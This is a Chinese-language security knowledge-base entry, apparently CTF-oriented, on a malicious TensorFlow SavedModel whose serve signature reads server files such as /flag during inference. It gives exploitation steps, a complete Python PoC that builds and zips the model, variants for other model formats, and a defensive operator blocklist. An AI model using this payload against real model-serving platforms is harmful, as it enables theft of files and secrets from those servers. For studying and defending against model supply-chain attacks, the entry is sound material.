---
id: ai-security-supply-chain-tensorflow-savedmodel-serve-file-read
title: 恶意 TensorFlow SavedModel 的 serve 签名：tf.io.matching_files/read_file 在推理时读取服务器 flag
type: scenario
domain: ai-security
path: ai-security/supply-chain
technique: tensorflow-savedmodel-serve-file-read
tags:
- ai
- tensorflow
- savedmodel
- model-upload
- file-read
- supply-chain
- tf-module
- inference
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V204
  verified_at: '2026-11-07T02:40:13+08:00'
  notes: 已对照原文与全部 89 张图片核对；serve 签名与 matching_files/read_file 链一致；未在目标复现
url: /docs/ai-security/supply-chain/ai-security-supply-chain-tensorflow-savedmodel-serve-file-read/
draft: false
kb_aliases:
- TensorFlow SavedModel 恶意模型
- 模型上传任意文件读取
- tf.io.read_file 读 flag
- serve 签名滥用
- 模型供应链文件读取
---

## 一句话结论

模型服务平台允许用户上传 zip 形式的 TensorFlow SavedModel 并调用其 `serve` 签名时，攻击者可以定义一个 `tf.Module`，在 `@tf.function` 中用 `tf.io.matching_files` 枚举 `/flag`、`/app/*flag*` 等路径、用 `tf.io.read_file` 读取内容并作为 `prediction` 返回；上传后调用推理即可读出服务器文件。

## 原理

- TensorFlow SavedModel 保存的是完整的计算图与签名，不仅仅是权重；加载模型后，平台按签名（如 `serve`）调用 `tf.function`，图内的算子会在服务进程内执行。
- `tf.io.matching_files(pattern)` 执行 glob 文件匹配，`tf.io.read_file(path)` 读取文件内容，都是 TensorFlow 的一等算子，不依赖 Python 侧的文件 API；因此恶意模型可以在推理图里完成文件系统访问。
- 平台通常只校验模型能加载、签名存在、输入形状匹配，不会检查图中是否包含文件 I/O、网络或命令执行类算子；模型加载后的推理进程又拥有读取 flag 的权限，于是模型即攻击载荷。
- 使用 `tf.map_fn` 批量匹配多个路径、`tf.unique` 去重、`tf.cond` 选择第一个命中文件，可以让一次推理返回目标文件内容；整个载荷以 SavedModel 目录 + zip 形式上传，具有较好的隐蔽性。

## 触发条件

- 平台提供“上传模型 → 加载 → 调用 serve/推理”的功能，且允许用户上传完整 SavedModel（而非仅权重）。
- 推理进程对目标文件（如 `/flag`）有读权限。
- 平台没有对 SavedModel 计算图做算子白名单/沙箱隔离。

## 利用步骤

1. 用 `tf.Module` 定义模型，`__call__` 中用 `tf.io.matching_files` 匹配候选 flag 路径，`tf.io.read_file` 读取第一个命中文件。
2. `tf.saved_model.save(model, export_dir, signatures={"serve": model.__call__})` 导出 SavedModel。
3. 将导出目录压缩为 zip，通过平台上传接口提交。
4. 调用平台的推理/`serve` 接口，传入任意符合形状的输入，响应中的 `prediction` 即为文件内容。
5. 若路径未知，扩大 glob 模式（`/*flag*`、`/app/*flag*`、`/home/*flag*`、`/tmp/*flag*`）。

## PoC

```python
import tensorflow as tf, tempfile, pathlib, zipfile, os

class FlagSearcher(tf.Module):
    def __init__(self, patterns):
        super().__init__()
        self.patterns = tf.constant(patterns, dtype=tf.string)

    @tf.function(input_signature=[tf.TensorSpec(shape=[None, None], dtype=tf.float32)])
    def __call__(self, x):
        def find(p):
            return tf.io.matching_files(p)
        all_matches = tf.map_fn(find, self.patterns,
                                fn_output_signature=tf.RaggedTensorSpec(shape=[None], dtype=tf.string))
        files = tf.reshape(all_matches.flat_values, [-1])
        files = tf.boolean_mask(files, tf.strings.length(files) > 0)
        uniq = tf.unique(files).y
        result = tf.cond(tf.size(uniq) > 0,
                         lambda: tf.io.read_file(uniq[0]),
                         lambda: tf.constant("not found"))
        return {"prediction": tf.reshape(result, [1, 1])}

model = FlagSearcher(["/flag", "/flag.txt", "/app/flag", "/*flag*", "/app/*flag*"])
out = pathlib.Path(tempfile.mkdtemp()) / "model"
tf.saved_model.save(model, str(out), signatures={"serve": model.__call__})
with zipfile.ZipFile("model.zip", "w", zipfile.ZIP_DEFLATED) as z:
    for root, _, files in os.walk(out):
        for f in files:
            p = os.path.join(root, f)
            z.write(p, os.path.relpath(p, out))
```

## 变体与关联

- 其他模型格式：TorchScript `torch.jit.load` + `aten::save` 任意文件写入、ONNX 自定义算子、Keras Lambda 层、Rasa 模型 metadata 动态导入。
- 读文件替代：`tf.data`、`tf.io.gfile`、`tf.raw_ops`、`tf.text` 等算子；也可组合网络请求外带。
- 关联：PyTorch state_dict 输出层投毒（只影响结果）、TorchScript 文件写入（持久化）、LLM GGUF chat_template SSTI RCE。

## 检测与防御

- 不要加载不可信模型；模型上传后在隔离容器/只读文件系统中运行，推理进程不挂载敏感文件。
- 对 SavedModel 计算图做算子白名单，拦截 `ReadFile`、`MatchingFiles`、`WriteFile`、网络/进程类算子。
- 对上传的模型做静态扫描与签名校验，限制模型目录/文件类型；推理服务最小权限运行。
- 对模型推理请求的异常文件系统访问做审计与告警。
